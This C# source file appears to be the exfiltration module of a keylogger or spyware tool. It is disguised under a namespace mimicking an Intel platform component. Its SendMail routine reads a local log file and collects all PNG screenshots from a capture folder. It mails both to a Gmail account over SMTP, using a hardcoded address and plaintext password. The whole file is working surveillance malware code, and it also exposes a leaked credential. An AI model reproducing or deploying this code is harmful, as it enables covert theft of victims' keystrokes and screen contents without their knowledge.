using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace Intel_R__Dynamic_Platform
{
    partial class Program
    {
        #region Mail
        public static void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("corevninfo@gmail.com");
                mail.To.Add("corevninfo@gmail.com");
                mail.Subject = "OK" + DateTime.Now.ToLongDateString();
                mail.Body = "Thông tin từ\n";




                string logFile = logName + logExtendtion;

                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);

                    mail.Body += sr.ReadToEnd();

                    sr.Close();
                }

                string directoryImage = Capture.imagePath;
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("corevninfo@gmail.com", "Na@0547401");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                //Console.WriteLine("Send mail!");


                // https://www.google.com/settings/u/1/security/lesssecureapps
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        #endregion
    }
}
